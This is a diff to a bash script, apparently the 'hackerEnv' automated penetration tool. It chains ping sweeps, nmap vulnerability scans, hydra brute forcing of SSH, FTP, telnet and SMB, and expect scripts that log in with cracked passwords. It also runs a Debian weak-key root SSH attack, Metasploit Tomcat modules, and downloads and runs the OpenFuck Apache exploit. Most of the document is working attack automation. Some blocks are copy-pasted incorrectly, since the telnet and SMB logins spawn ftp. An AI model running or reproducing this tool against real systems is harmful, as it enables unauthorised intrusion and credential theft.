@@ -24,7 +24,7 @@ then
 fi
 if [ ! -d $(dirname $0)/exploits/ ]
 then
-	mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache}
+	mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache,telnet}
 fi
 if [ -f report.html ]
 then
@@ -95,8 +95,7 @@ function sshBruteForce(){
 		tmux new-window -n sshBruteForce "bash -c 'hydra -t 4 -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt ssh://$ips -o $ips/sshPassword.txt; read; bash'" \; 2> /dev/null
 		sleep 10
 	fi
-	grep "\[" $ips/sshPassword.txt > $ips/sshPass.txt
-
+	grep -v -e "#" $ips/sshPassword.txt | grep "\[" > $ips/sshPass.txt
 	count=1
 	while read pass
 	do
@@ -108,29 +107,34 @@ function sshBruteForce(){
 			remediation="change it to 12 Characters, minimum, includes Numbers, Symbols, Capital Letters, and Lower-Case Letters avoid a dictionary word or combination of dictionary words and doesn’t rely on obvious substitutions:"
 			references="https://www.howtogeek.com/195430/how-to-create-a-strong-password-and-remember-it/"
 			report2
-		fi
-		if [ "$username" != "" ] && [ "$password" != "" ]
-		then
-			echo -e "Username: $username Password: $password"
-			cat <<- sshlogin > $(dirname $0)/exploits/ssh/sshlogin$count.exp
-				#!/usr/bin/expect -f
-				spawn ssh $username@$ips 
-				expect "(yes/no/[fingerprint])?"
-				send "yes\r"
-				expect "password"
-				send "$password\r"
-				expect ":~$ "
-				interact
-			sshlogin
-			chmod +x $(dirname $0)/exploits/ssh/sshlogin$count.exp
-			if [ "$tmux" = "bash" ]
+			if [ "$username" != "" ] && [ "$password" != "" ]
 			then
-				gnome-terminal -e "bash -c 'expect $(dirname $0)/exploits/ssh/sshlogin$count.exp; bash'" \; 2> /dev/null
-			else
-				tmux split-window -t sshBruteForce "bash -c 'expect $(dirname $0)/exploits/ssh/sshlogin$count.exp; read; bash'" \; 2> /dev/null
+				echo -e "Username: \e[32m$username\e[0m Password: \e[32m$password\e[0m"
+				cat <<- sshlogin > $(dirname $0)/exploits/ssh/sshlogin$count.exp
+					#!/usr/bin/expect -f
+					spawn ssh $username@10.0.2.5 
+					expect {
+					  "*?assword" {
+						send "$password\r"
+						exp_continue
+					  }
+					  "Are you sure you want to \continue connecting" {
+						send "yes\r"
+						exp_continue
+					  }
+					}
+					interact
+				sshlogin
+				chmod +x $(dirname $0)/exploits/ssh/sshlogin$count.exp
+				if [ "$tmux" = "bash" ]
+				then
+					gnome-terminal -e "bash -c 'expect $(dirname $0)/exploits/ssh/sshlogin$count.exp; bash'" \; 2> /dev/null
+				else
+					tmux split-window -t sshBruteForce "bash -c 'expect $(dirname $0)/exploits/ssh/sshlogin$count.exp; read; bash'" \; 2> /dev/null
+				fi
 			fi
+			((count++))
 		fi
-		((count++))
 	done < $ips/sshPass.txt
 }
 function ftpBruteForce(){
@@ -147,15 +151,46 @@ function ftpBruteForce(){
 		tmux new-window -n ftpBruteForce "bash -c 'hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt ftp://$ips -o $ips/ftpPassword.txt; read; bash'" \; 2> /dev/null
 		sleep 10
 	fi
-	grep "\[" $ips/ftpPassword.txt > $ips/ftpPass.txt
+	grep -v -e "#" $ips/ftpPassword.txt | grep "\[" > $ips/ftpPass.txt
+	count=1
 	while read pass
 	do
+		username="$(echo "$pass"|cut -f7-7 -d' ')"
+		password="$(echo "$pass"|cut -f11-11 -d' ')"
 		if [ "$pass" != "" ]
 		then
 			description="FTP has a weak password, very easy to guess: <b style="color:red">$pass</b>"
 			remediation="change it to 12 Characters, minimum, includes Numbers, Symbols, Capital Letters, and Lower-Case Letters avoid a dictionary word or combination of dictionary words and doesn’t rely on obvious substitutions:"
 			references="https://www.howtogeek.com/195430/how-to-create-a-strong-password-and-remember-it/"
 			report2
+			if [ "$username" != "" ] && [ "$password" != "" ]
+			then
+				echo -e "Username: \e[32m$username\e[0m Password: \e[32m$password\e[0m"
+				cat <<- ftplogin > $(dirname $0)/exploits/ftp/ftplogin$count.exp
+					#!/usr/bin/expect -f
+					spawn ftp 10.0.2.5 
+					expect {
+					  ":" {
+						send "$username\r"
+						exp_continue
+					  }
+					  "*?assword" {
+						send "$password\r"
+						exp_continue
+					  }
+					}
+					expect "ftp>"
+					interact
+				ftplogin
+				chmod +x $(dirname $0)/exploits/ftp/ftplogin$count.exp
+				if [ "$tmux" = "bash" ]
+				then
+					gnome-terminal -e "bash -c 'expect $(dirname $0)/exploits/ftp/ftplogin$count.exp; bash'" \; 2> /dev/null
+				else
+					tmux split-window -t ftpBruteForce "bash -c 'expect $(dirname $0)/exploits/ftp/ftplogin$count.exp; read; bash'" \; 2> /dev/null
+				fi
+			fi
+			((count++))
 		fi
 	done < $ips/ftpPass.txt
 }
@@ -173,7 +208,8 @@ function telnetBruteForce(){
 		tmux new-window -n telnetBruteForce "bash -c 'hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt telnet://$ips -o $ips/telnetPassword.txt; read; bash'" \; 2> /dev/null
 		sleep 10
 	fi
-	grep "\[" $ips/telnetPassword.txt > $ips/telnetPass.txt
+	grep -v -e "#" $ips/telnetPassword.txt | grep "\[" > $ips/telnetPass.txt
+	count=1
 	while read pass
 	do
 		if [ "$pass" != "" ]
@@ -182,6 +218,34 @@ function telnetBruteForce(){
 			remediation="change it to 12 Characters, minimum, includes Numbers, Symbols, Capital Letters, and Lower-Case Letters avoid a dictionary word or combination of dictionary words and doesn’t rely on obvious substitutions:"
 			references="https://www.howtogeek.com/195430/how-to-create-a-strong-password-and-remember-it/"
 			report2
+			if [ "$username" != "" ] && [ "$password" != "" ]
+			then
+				echo -e "Username: \e[32m$username\e[0m Password: \e[32m$password\e[0m"
+				cat <<- telnetlogin > $(dirname $0)/exploits/telnet/telnetlogin$count.exp
+					#!/usr/bin/expect -f
+					spawn ftp 10.0.2.5 
+					expect {
+					  ":" {
+						send "$username\r"
+						exp_continue
+					  }
+					  "*?assword" {
+						send "$password\r"
+						exp_continue
+					  }
+					}
+					expect "ftp>"
+					interact
+				telnetlogin
+				chmod +x $(dirname $0)/exploits/telnet/telnetlogin$count.exp
+				if [ "$tmux" = "bash" ]
+				then
+					gnome-terminal -e "bash -c 'expect $(dirname $0)/exploits/telnet/telnetlogin$count.exp; bash'" \; 2> /dev/null
+				else
+					tmux split-window -t telnetBruteForce "bash -c 'expect $(dirname $0)/exploits/telnet/telnetlogin$count.exp; read; bash'" \; 2> /dev/null
+				fi
+			fi
+			((count++))
 		fi
 	done < $ips/telnetPass.txt
 }
@@ -199,7 +263,8 @@ function smbBruteForce(){
 		tmux new-window -n smbBruteForce "bash -c 'hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt smb://$ips -o $ips/smbPassword.txt; read; bash'" \; 2> /dev/null
 		sleep 10
 	fi
-	grep "\[" $ips/smbPassword.txt > $ips/smbPass.txt
+	grep -v -e "#" $ips/smbPassword.txt | grep "\[" > $ips/smbPass.txt
+	count=1
 	while read pass
 	do
 		if [ "$pass" != "" ]
@@ -208,6 +273,34 @@ function smbBruteForce(){
 			remediation="change it to 12 Characters, minimum, includes Numbers, Symbols, Capital Letters, and Lower-Case Letters avoid a dictionary word or combination of dictionary words and doesn’t rely on obvious substitutions:"
 			references="https://www.howtogeek.com/195430/how-to-create-a-strong-password-and-remember-it/"
 			report2
+			if [ "$username" != "" ] && [ "$password" != "" ]
+			then
+				echo -e "Username: \e[32m$username\e[0m Password: \e[32m$password\e[0m"
+				cat <<- telnetlogin > $(dirname $0)/exploits/telnet/telnetlogin$count.exp
+					#!/usr/bin/expect -f
+					spawn ftp 10.0.2.5 
+					expect {
+					  ":" {
+						send "$username\r"
+						exp_continue
+					  }
+					  "*?assword" {
+						send "$password\r"
+						exp_continue
+					  }
+					}
+					expect "ftp>"
+					interact
+				telnetlogin
+				chmod +x $(dirname $0)/exploits/telnet/telnetlogin$count.exp
+				if [ "$tmux" = "bash" ]
+				then
+					gnome-terminal -e "bash -c 'expect $(dirname $0)/exploits/telnet/telnetlogin$count.exp; bash'" \; 2> /dev/null
+				else
+					tmux split-window -t telnetBruteForce "bash -c 'expect $(dirname $0)/exploits/telnet/telnetlogin$count.exp; read; bash'" \; 2> /dev/null
+				fi
+			fi
+			((count++))
 		fi
 	done < $ips/smbPass.txt
 }
@@ -224,20 +317,20 @@ function OpenSSH4_7p1(){
 		tar -C $(dirname $0)/exploits/ssh/ -xjf $(dirname $0)/exploits/ssh/5622.tar.bz2
 	fi
 	sleep 30
-	ruby $(dirname $0)/exploits/ssh/5632 $ips root $(dirname $0)/exploits/ssh/rsa/2048 > $ips/keys.txt 2> /dev/null
+	tmux new-window -n keysAttack "bash -c 'ruby $(dirname $0)/exploits/ssh/5632 $ips root $(dirname $0)/exploits/ssh/rsa/2048 > $ips/keys.txt; read; bash'" \; 2> /dev/null
 	sleep 20
-	sed -n -e '/FOUND:/,$p' $ips/keys.txt| sed '1d' >$ips/key.txt
+	grep -v -e 'testing' -e 'KEYFILE' $ips/keys.txt > $ips/key.txt
 	sleep 2
 	while read key
 	do
-		if [ "$key" != "KEYFILE FOUND: " ]
+		if [ "$key" != "" ]
 		then
 			if [ "$tmux" = "bash" ]
 			then
 				gnome-terminal -e "bash -c 'ssh -l root -p 22 -i $key $ips; bash'" 2> /dev/null
 				sleep 10
 			else
-				tmux new-window -n keysAttack "bash -c 'ssh -l root -p 22 -i $key $ips; read; bash'" \; 2> /dev/null
+				tmux split-window -t keysAttack "bash -c 'ssh -l root -p 22 -i $key $ips; read; bash'" \; 2> /dev/null
 				sleep 10
 			fi
 			description="A weakness has been discovered in the random number generator used by OpenSSL on Debian and Ubuntu systems. As a result of this weakness, certain encryption keys are much more common than they should be, such that an attacker could guess the key through a brute-force attack given minimal knowledge of the system. This particularly affects the use of encryption keys in OpenSSH, OpenVPN and SSL certificates. This vulnerability only affects operating systems which are based on Debian. However, other systems can be indirectly affected if weak keys are imported into them. KEYFILE FOUND: <b style="color:red">$key</b>"
@@ -298,7 +391,6 @@ function usermap_script(){
 to the SamrChangePassword() MS-RPC function in combination
 with the 'username map script' smb.conf option (which is not
 enabled by default).
-
 After further investigation by Samba developers, it was
 determined that the problem was much broader and impacts
 remote printer and file share management as well.  The root
@@ -508,7 +600,7 @@ function report3(){
 			</body>
 		</html>
 	report3
-	echo "Report was generated => $(pwd=$(pwd); echo "file://$pwd/report.html")"
+	echo "Report was generated => $(echo 'file://'$(pwd)'/report.html')"
 }
 ############################### Program starts here #####################
 if ! command -v figlet 2> /dev/null 1> /dev/null
@@ -516,6 +608,17 @@ then
 	apt install figlet -y 2> /dev/null 1> /dev/null
 else
 	figlet -t -f slant "hackerEnv"
+fi
+if [ ! -d /usr/share/nmap/scripts/nmap-vulners ]
+then
+	cd /usr/share/nmap/scripts/
+	git clone https://github.com/vulnersCom/nmap-vulners.git
+	cd -
+elif [ ! -d /usr/share/nmap/scripts/vulscan ]
+then
+	cd /usr/share/nmap/scripts/
+	git clone https://github.com/scipag/vulscan.git
+	cd -
 fi
 cleanning
 report
@@ -564,33 +667,43 @@ then
 	ips="$(cat $(dirname $0)/online.txt)"
 	echo -e "$attacker" > $(dirname $0)/urIp.txt
 	ip="$(cat $(dirname $0)/urIp.txt)"
+elif [ "$target" != "" ] && [ "$interface" != "" ]
+then
+	ifconfig $interface| grep -oP 'inet \K[^ ]+' > $(dirname $0)/urIp.txt
+	ip="$(cat $(dirname $0)/urIp.txt)"
+	echo -e "$target" > $(dirname $0)/online.txt
+elif [ "$target" != "" ] && [ "$interface" != "" ] && [ "$subNetwork" != "" ]
+then
+	ifconfig $interface| grep -oP 'inet \K[^ ]+' > $(dirname $0)/urIp.txt
+	ip="$(cat $(dirname $0)/urIp.txt)"
+	fping -a -g $target$subNetwork 2> /dev/null > $(dirname $0)/online.txt
+elif [ "$subNetwork" != "" ] && [ "$interface" != "" ]
+then
+	ifconfig $interface| grep -oP 'inet \K[^ ]+' > $(dirname $0)/urIp.txt
+	ip="$(cat $(dirname $0)/urIp.txt)"
+	fping -a -g $ip$subNetwork 2> /dev/null > $(dirname $0)/online.txt
+elif [ "$subNetwork" != "" ] && [ "$attacker" != "" ]
+then
+	ip="$(cat $(dirname $0)/urIp.txt)"
+	fping -a -g $attacker$subNetwork 2> /dev/null > $(dirname $0)/online.txt
+elif [ "$interface" != "" ] && [ "$attacker" != "" ]
+then
+	echo -e "$attacker" > $(dirname $0)/urIp.txt
+	ifconfig $interface| grep -oP 'inet \K[^ ]+' > $(dirname $0)/online.txt
+	ips="$(cat $(dirname $0)/online.txt)"
+	fping -a -g $ips/24 2> /dev/null > $(dirname $0)/online.txt
+elif [ "$interface" != "" ]
+then
+	ifconfig $interface| grep -oP 'inet \K[^ ]+' > $(dirname $0)/urIp.txt
+	ip="$(cat $(dirname $0)/urIp.txt)"
+	fping -a -g $ip/24 2> /dev/null > $(dirname $0)/online.txt
+elif [ "$target" != "" ]
+then
+	echo -e "$target" > $(dirname $0)/online.txt
+	ips="$(cat $(dirname $0)/online.txt)"
 else
-	if [ "$subNetwork" != "" ] && [ "$interface" != "" ]
-	then
-		ifconfig $interface| grep -oP 'inet \K[^ ]+' > $(dirname $0)/urIp.txt
-		ip="$(cat $(dirname $0)/urIp.txt)"
-		fping -a -g $ip$subNetwork 2> /dev/null > $(dirname $0)/online.txt
-	elif [ "$subNetwork" != "" ] && [ "$attacker" != "" ]
-	then
-		ip="$(cat $(dirname $0)/urIp.txt)"
-		fping -a -g $attacker$subNetwork 2> /dev/null > $(dirname $0)/online.txt
-	elif [ "$interface" != "" ]
-	then
-		ifconfig $interface| grep -oP 'inet \K[^ ]+' > $(dirname $0)/urIp.txt
-		ip="$(cat $(dirname $0)/urIp.txt)"
-		fping -a -g $ip/24 2> /dev/null > $(dirname $0)/online.txt
-	elif [ "$target" != "" ]
-	then
-		echo -e "$target" > $(dirname $0)/online.txt
-		ips="$(cat $(dirname $0)/online.txt)"
-	elif [ "$attacker" != "" ]
-	then
-		fping -a -g $attacker/24 2> /dev/null > $(dirname $0)/online.txt
-		ips="$(cat $(dirname $0)/online.txt)"
-	else
-		fping -a -g $ip/24 2> /dev/null > $(dirname $0)/online.txt
-		ips="$(cat $(dirname $0)/online.txt)"
-	fi
+	fping -a -g $ip/24 2> /dev/null > $(dirname $0)/online.txt
+	ips="$(cat $(dirname $0)/online.txt)"
 fi
 echo "Performing a ping sweep is in process"
 echo -e "Your ip address is \e[1m$ip\e[0m"
@@ -618,10 +731,11 @@ do
 	echo -e "Performing port scan on \e[1m$ips\e[0m"
 	if [ "$aggressive" == true ]
 	then
-		nmap -v0 -sV -n -Pn -p- -T4 -A -O --open -oA "$ips"/"$ips" $ips 1> /dev/null
+		nmap -v0 -sV -n -Pn -p- -T4 -A -O --open --script nmap-vulners,vulscan --script-args vulscandb=exploitdb.csv -oA "$ips"/"$ips" $ips 1> /dev/null
 	else
 		nmap -v0 -Pn -n -sV -T4 -A -O -oA "$ips"/"$ips" $ips 1> /dev/null
 	fi
+	echo "PORT	 STATE SERVICE	   VERSION"
 	grep "open" $ips/$ips.nmap |sed '1d'
 
 	cat $ips/$ips.xml | grep -oP 'name="\K[^"]+' > $ips/nameTmp.txt
@@ -635,7 +749,7 @@ do
 	productOpenfk="$(cat $ips/Apache.txt |cut -f4-4 -d' '|grep -oP '\(\K[^\)]+')"
 	operatinS="$(cat $ips/Apache.txt |grep -o '^[^ ]*')"
 	ostype="$(cat $ips/$ips.xml | grep -oP 'osfamily="\K[^"]+' |head -1)"
-	osgen="$(cat $ips/$ips.xml | grep -oP 'osgen="\K[^"]+' | xargs | sed 's/ / or /g')"
+	osgen="$(cat $ips/$ips.xml | grep -oP '<osmatch name="\K[^"]+' |head -1)"
 	sleep 10
 	if [ "$(grep "netbios-ssn" $ips/name.txt)" = "netbios-ssn" ]
 	then
@@ -645,7 +759,7 @@ do
 	then
 		echo -e "OS type: \e[1;34m$smbOS\e[0m"
 	else
-		echo -e "OS type: \e[1;34m$ostype $osgen\e[0m"
+		echo -e "OS type: \e[1;34m$ostype: $osgen\e[0m"
 	fi
 	echo -e "Performing vulnerability scan on \e[1m$ips\e[0m"
 	while read name
@@ -691,6 +805,10 @@ do
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mremote code execution\e[0m"
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
 					port="$(cat $ips/$ips.nmap | grep "Apache Tomcat/Coyote JSP engine"| cut -f1-1 -d/)"
+					if [ -f $(dirname $0)/exploits/apache/tomcat_mgr_login.txt ]
+					then
+						rm $(dirname $0)/exploits/apache/tomcat_mgr_login.txt
+					fi
 					cat <<- tomcatScanner > $(dirname $0)/exploits/apache/tomcat_mgr_login.rc
 						use auxiliary/scanner/http/tomcat_mgr_login
 						set RHOSTS $ips
@@ -743,7 +861,7 @@ do
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
-						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache}
+						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache,telnet}
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
@@ -768,7 +886,7 @@ do
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
-						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache}
+						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache,telnet}
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
@@ -793,7 +911,7 @@ do
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
-						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache}
+						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache,telnet}
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
@@ -824,7 +942,6 @@ do
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
-						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache}
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
@@ -853,7 +970,6 @@ do
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
-						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache}
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
@@ -880,7 +996,6 @@ do
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
-						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache}
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
@@ -906,7 +1021,6 @@ do
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
-						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache}
 						wget -q -P exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
@@ -931,7 +1045,6 @@ do
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
-						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache}
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
@@ -960,7 +1073,6 @@ do
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
-						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache}
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
@@ -987,7 +1099,6 @@ do
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
-						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache}
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
@@ -1012,7 +1123,6 @@ do
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
-						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache}
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
@@ -1039,7 +1149,6 @@ do
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
-						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache}
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
@@ -1064,7 +1173,6 @@ do
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
-						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache}
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
@@ -1089,7 +1197,6 @@ do
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
-						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache}
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
@@ -1128,7 +1235,6 @@ do
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
-						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache}
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
@@ -1155,7 +1261,6 @@ do
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
-						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache}
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
@@ -1190,7 +1295,6 @@ do
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
-						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache}
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
@@ -1223,7 +1327,6 @@ do
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
-						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache}
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
@@ -1250,7 +1353,7 @@ do
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
-						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache}
+ 
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
@@ -1277,7 +1380,7 @@ do
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
-						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache}
+ 
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
@@ -1304,7 +1407,7 @@ do
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
-						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache}
+ 
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
@@ -1329,7 +1432,7 @@ do
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
-						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache}
+ 
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
@@ -1364,7 +1467,7 @@ do
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in process"
 					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
 					then
-						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache}
+ 
 						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
